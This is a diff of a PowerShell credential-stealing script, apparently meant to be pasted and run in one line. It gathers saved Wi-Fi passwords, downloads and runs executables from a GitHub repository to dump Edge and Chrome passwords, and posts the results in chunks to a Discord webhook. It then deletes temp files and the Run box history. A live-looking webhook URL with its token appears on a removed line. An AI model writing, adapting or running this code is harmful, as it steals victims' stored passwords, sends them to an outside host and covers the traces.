@@ -1,4 +1,3 @@
-﻿
 
 $D="$env:tmp";
 
@@ -38,14 +37,14 @@ foreach ($network in $networks) {
         PROFILE_NAME = $name
         PASSWORD = $password
     } | Out-File $FileName -Append;
-}
+};
 
 
 Add-Content -Path “$FileName” -Value “Edge Passwords” 
      
     $edgeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/edge/edge.exe';
     $EdgePath = '.\edge.exe';
-    if (-not (Test-Path -Path $EdgePath)) {Invoke-WebRequest -Uri $edgeUrl -OutFile $edgePath;}
+    if (-not (Test-Path -Path $EdgePath)) {Invoke-WebRequest -Uri $edgeUrl -OutFile $edgePath;};
 $EdgeOutput = & $edgePath | Out-File $FileName -Append;
     
 
@@ -54,16 +53,16 @@ Add-Content -Path “$FileName” -Value “Chrome Passwords”
 
     $chromeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/chrome/chrome.exe';
     $chromePath = '.\chrome.exe';
-    if (-not (Test-Path -Path $chromePath)) {Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath;}
+    if (-not (Test-Path -Path $chromePath)) {Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath;};
 $chromeOutput = & $chromePath | Out-File $FileName -Append;
    
 
 
 
-$args1 = Get-Content .\$FileName
+$args1 = Get-Content .\$FileName;
 
 $statOutput = $args1 | Out-String;
-    $webhookUrl = 'https://discord.com/api/webhooks/1256048768206241803/BWYs2QrnsKznXQ9dSCCX4FJVvQvHKn9KpcvXFHJoKL5iWCRW_FWMravdB-8qJfslVn_n';
+    $webhookUrl = 'INSERT YOUR WEBHOOK DEETS HERE';
     $chunks = [Math]::Ceiling($statOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $statOutput.Length - $start);$content = $statOutput.Substring($start, $length); 
     $webhookContent = @{'username' = '${env:computername}';'content' = $content;};  
     $jsonData = ConvertTo-Json -InputObject $webhookContent;IWR -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';Start-Sleep -Seconds 1;};
@@ -72,7 +71,7 @@ $statOutput = $args1 | Out-String;
 
 cd\
 # empty temp folder
-rm $D\Pass* -r -Force -ErrorAction SilentlyContinue
+rm $D\Pass* -r -Force -ErrorAction SilentlyContinue;
 
 # delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f;
